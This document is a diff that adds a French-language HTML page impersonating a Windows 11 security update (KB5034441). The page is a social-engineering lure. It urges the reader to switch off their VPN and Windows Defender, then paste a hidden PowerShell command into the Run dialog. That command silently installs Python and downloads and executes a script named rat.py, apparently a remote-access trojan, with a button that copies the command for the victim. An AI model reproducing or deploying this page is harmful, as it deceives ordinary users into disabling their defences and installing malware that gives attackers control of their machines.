@@ -1,1 +1,63 @@
-<div class="code-box" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile $env:TEMP\py.exe; Start-Process $env:TEMP\py.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait; iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py -OutFile $env:TEMP\r.py; C:\Program Files\Python310\python.exe $env:TEMP\r.py"</div>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mise à jour Windows</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f3f3f3; color: #333; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 600px; text-align: center; }
+        .logo { font-size: 40px; color: #0078D7; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin-bottom: 15px; color: #0078D7; }
+        p { font-size: 15px; color: #555; margin-bottom: 15px; line-height: 1.5; text-align: left; }
+        
+        .code-box { background-color: #f0f0f0; padding: 15px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 13px; color: #d32f2f; cursor: pointer; display: block; margin: 15px 0; text-align: left; border: 1px dashed #ccc; word-break: break-all; }
+        .code-box:hover { background-color: #e0e0e0; }
+        .code-box:active { background-color: #d0d0d0; }
+        
+        .instruction { font-size: 14px; color: #666; margin-top: 10px; text-align: left; }
+        
+        .btn { background-color: #0078D7; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        .btn:hover { background-color: #005a9e; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">⊞</div>
+        <h1>Mise à jour de sécurité Windows 11</h1>
+        <p>La mise à jour <strong>KB5034441</strong> est bloquée sur votre appareil car une protection obsolète ou un réseau VPN a été détecté.</p>
+        <p><strong>Pour résoudre ce problème :</strong></p>
+        <ol style="font-size: 14px; color: #555; text-align: left; margin-bottom: 15px; padding-left: 20px;">
+            <li>Désactivez votre VPN le temps de l'installation.</li>
+            <li><strong>Désactivez totalement votre antivirus</strong> (Windows Defender) sinon l'installation sera bloquée.</li>
+            <li>Laissez votre navigateur <strong>ouvert</strong> pendant toute la durée de la réparation.</li>
+        </ol>
+        
+        <p>Exécutez la commande suivante dans l'invite de commandes :</p>
+        
+        <div class="code-box" onclick="copyCode()" id="cmdText">powershell -w hidden -c "iwr -useb https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile $env:TEMP\py.exe; Start-Process $env:TEMP\py.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait; iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py -OutFile $env:TEMP\r.py; C:\Program Files\Python310\python.exe $env:TEMP\r.py"</div>
+        
+        <p class="instruction">Appuyez sur <b>Windows + R</b>, collez le code et appuyez sur <b>Entrée</b>.</p>
+        
+        <button class="btn" onclick="copyCode()">Copier la commande</button>
+    </div>
+
+    <script>
+        function copyCode() {
+            const text = document.getElementById('cmdText').innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const el = document.getElementById('cmdText');
+                el.innerText = "✅ Code copié ! Appuyez sur Windows + R";
+                el.style.color = "#4caf50";
+                setTimeout(() => {
+                    el.innerText = text;
+                    el.style.color = "#d32f2f";
+                }, 3000);
+            });
+        }
+    </script>
+</body>
+</html>
